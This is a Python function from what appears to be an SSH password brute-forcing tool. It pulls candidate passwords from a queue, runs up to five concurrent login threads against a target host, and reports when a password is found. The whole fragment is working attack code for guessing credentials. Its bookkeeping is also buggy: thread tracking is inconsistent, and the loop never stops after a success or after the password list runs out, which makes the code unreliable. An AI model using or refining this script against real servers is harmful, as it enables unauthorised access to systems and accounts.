
def test_password_given_by_admin(hostname, port, username, password_queue: queue.Queue) -> bool:
    max_running_threads = 5
    threads: List[threading.Thread] = []
    result_queue: queue.Queue[Result] = queue.Queue(maxsize=max_running_threads)
    while True:
        try:
            print("try")
            while (not result_queue.empty()):
                # print("thread finished")            
                finished_thread: SSHLoginThreadResult = result_queue.get()
                # print(f"thread {finished_thread.identifier} finished, result = {finished_thread.result}")
                if isinstance(finished_thread.result, AuthenticationSuccess):
                    cprint(f"\n[+] password found! it is {finished_thread.result.message}", "green", attrs=["bold"])
                if isinstance(finished_thread.result, AuthenticationFailed):
                    cprint(f"[-] password is not {finished_thread.result.message}", "red")
                threads.remove(finished_thread.identifier)

                
            if len(threads) == max_running_threads:
                # sleep(0.5)
                continue
            # print(len(threads))
            thread: threading.Thread = threading.Thread(
                target=ssh_login, 
                args=(
                    len(threads), 
                    hostname, 
                    port, 
                    username, 
                    password_queue.get_nowait(), 
                    result_queue
                )
            )
            thread.start()
            threads.append(len(threads))
            print(f"[+] Started thread ({len(threads)})")
        except queue.Empty:
            continue

    # cprint.info("[SESSION_FAILED]: Password was not found")
    return False
